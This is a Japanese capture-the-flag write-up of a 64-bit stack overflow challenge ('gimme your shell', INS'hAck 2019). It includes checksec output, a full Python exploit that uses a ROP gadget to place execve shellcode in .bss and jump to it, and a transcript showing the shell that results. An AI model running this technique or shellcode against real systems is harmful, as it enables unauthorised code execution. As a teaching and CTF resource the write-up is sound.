# [pwn 50pts] gimme your shell - INS'hAck 2019
64ビットで全部無効です。
```
$ checksec -f weak
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   67 Symbols     No	0		2	weak
```

IDAで解析しましょう。
ご丁寧にvulnという名前の関数が用意されています。
中ではgetsを呼んでいて明らかなスタックオーバーフローですね。

せっかくNXが無効なのでsystem関数は使わずにshellcode実行をします。
`pop rdi`が無かったのですが、替わりに`mov edi, dword [rsp+0x30] ; add rsp, 0x38 ; ret`という良い感じのgadgetがあったのでこれを使いました。
bssセクションにshellcodeを書き込むのですが、bssセクションはアドレスに0x0aが入っていたので注意です。

```python
from ptrlib import *

elf = ELF("./weak")
sock = Process("./weak")

shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
plt_gets = 0x400450
ptr_sh = elf.section(".bss") + 0x100
rop_mov_edi_add_rsp = 0x400650

payload = b'A' * 0x18
payload += p64(rop_mov_edi_add_rsp)
payload += p64(0) * (0x30 // 8)
payload += p64(ptr_sh)
payload += p64(plt_gets)
payload += p64(ptr_sh)

sock.recvuntil("president.\n")
sock.sendline(payload)

sock.send(shellcode)

sock.interactive()
```

おしまい。
```
$ python solve.py 
[+] Process: Successfully created new process (PID=16433)
Oh I remember !
[ptrlib]$ id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
```

# 感想
解き方はいろいろありますが、初心者向けだと思います。
